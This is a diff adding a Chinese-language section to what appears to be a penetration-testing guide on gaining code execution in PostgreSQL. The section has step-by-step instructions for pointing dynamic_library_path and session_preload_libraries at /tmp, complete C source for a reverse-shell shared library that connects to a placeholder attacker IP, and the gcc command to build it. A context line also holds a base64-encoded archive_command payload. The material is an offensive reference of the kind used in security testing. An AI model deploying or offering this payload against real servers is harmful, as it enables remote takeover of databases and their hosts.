@@ -319,3 +319,69 @@ archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFM
 
 > 3. 重新加载配置：SELECT pg_reload_conf()
 > 4. 强制运行 WAL 操作，这将调用归档命令：对于某些 Postgres 版本， SELECT pg_switch_wal() 或 SELECT pg_switch_xlog().
+
+#### 带有预加载库的RCE
+
+该攻击向量利用以下配置变量：
+
+> session_preload_libraries  //PostgreSQL 服务器将在客户端连接时加载的库
+> dynamic_library_path  //PostgreSQL 服务器将在其中搜索库的目录列表
+
+我们可以将dynamic_library_path值设置为运行数据库的postgres用户可写的目录，例如/tmp/目录，并在那里上传恶意.so对象。 接下来，我们将通过将新上传的库包含在 session_preload_libraries 变量中来强制 PostgreSQL 服务器加载它。
+
+攻击步骤为：
+
+> 1. 下载原始的 postgresql.conf
+> 2. 在dynamic_library_path值中包含/tmp/目录，例如 动态库路径 = '/tmp:$libdir'
+> 3. 在 session_preload_libraries 值中包含恶意库名称，例如 session_preload_libraries = '有效负载.so'
+> 4. 通过 SELECT version() 查询检查主要 PostgreSQL 版本
+> 5. 使用正确的PostgreSQL开发包编译恶意库代码示例代码：
+
+```c
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include "postgres.h"
+#include "fmgr.h"
+
+#ifdef PG_MODULE_MAGIC
+PG_MODULE_MAGIC;
+#endif
+
+void _init() {
+   /*
+       code taken from https://www.revshells.com/
+   */
+
+   int port = REVSHELL_PORT;
+   struct sockaddr_in revsockaddr;
+
+   int sockt = socket(AF_INET, SOCK_STREAM, 0);
+   revsockaddr.sin_family = AF_INET;       
+   revsockaddr.sin_port = htons(port);
+   revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");
+
+   connect(sockt, (struct sockaddr *) &revsockaddr,
+   sizeof(revsockaddr));
+   dup2(sockt, 0);
+   dup2(sockt, 1);
+   dup2(sockt, 2);
+
+   char * const argv[] = {"/bin/bash", NULL};
+   execve("/bin/bash", argv, NULL);
+}
+```
+
+编译代码
+```bash
+ gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
+```
+
+> 6. 上传在步骤 2-3 中创建的恶意 postgresql.conf，并覆盖原始的
+> 7. 将第5步中的payload.so上传到/tmp目录
+> 8. 通过重新启动服务器或调用 SELECT pg_reload_conf() 查询来重新加载服务器配置
+> 9. 在下一次数据库连接时，将收到反向 shell 连接
